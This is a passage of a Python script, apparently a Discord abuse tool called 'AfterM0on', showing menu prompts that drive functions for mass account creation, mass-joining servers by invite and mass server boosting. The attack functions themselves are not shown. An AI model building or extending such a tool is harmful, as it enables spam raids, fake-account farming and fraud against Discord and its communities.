        time_went = round(end - go, 2)

        print()
        sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Click on the enter button to start a new server.", str, "Press")
        cls()
        asker()
    elif gzdfzad_zazfa == "true":
        amount_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Amount for creation account ]> ", int, "Quantity")
        invited_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Invitation for join discord ]> ", str, "Joinee")

        go = time.time()
        thread_lockmail(amount_a, invited_a)
        end = time.time()
        time_went = round(end - go, 2)

        print()
        sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Click on the enter button to start a new server.", str, "Press")
        cls()
        asker()
    elif sdfozp_append == "true":
        invite_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Server of invitation ]> discord.gg/", str, "Invitation")
        amount_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Quantity to joining  ]> ", int, "Quantity")

        go = time.time()
        thread_joining(invite_a, amount_a)
        end = time.time()
        time_went = round(end - go, 2)

        print()
        sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Click on the enter button to start a new server.", str, "Press")
        cls()
        asker()
    elif zdqsdposd_zad == "true":
        invite_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Server of invitation ]> discord.gg/", str, "Invitation")
        months_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Select 1 or 3 Months ]> ", int, "Months Boosts")
        amount_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Number of the boosts ]> ", int, "Boost Amount")
        nick_a   = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Change serv nickname ]> ", str, "Server Nickname")
        bio_a    = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Change serv biography]> ", str, "Server Bio")

        go = time.time()
        thread_boost(invite_a, amount_a, months_a, nick_a, bio_a)
        end = time.time()
        time_went = round(end - go, 2)

        print()
        sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Click on the enter button to start a new server.", str, "Press")
        cls()
        asker()
    else:
        cls()
        asker()
                


if __name__ == "__main__":
    try:
        asker()
    except KeyboardInterrupt:
        os._exit(1)